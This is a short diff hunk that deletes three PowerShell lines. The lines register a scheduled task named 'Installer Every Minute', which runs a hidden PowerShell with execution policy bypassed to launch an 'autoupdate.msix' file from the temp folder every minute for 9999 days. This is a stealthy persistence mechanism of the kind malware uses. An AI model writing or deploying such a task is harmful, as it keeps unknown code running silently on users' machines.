@@ -1,3 +1,0 @@
-$Action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"if (Test-Path -Path '$([System.IO.Path]::GetTempPath())autoupdate.msix') { Start-Process -FilePath '$([System.IO.Path]::GetTempPath())autoupdate.msix' }`""
-$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval  (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Days 9999)
-Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Installer Every Minute" -Description "This task will run the script every minute."
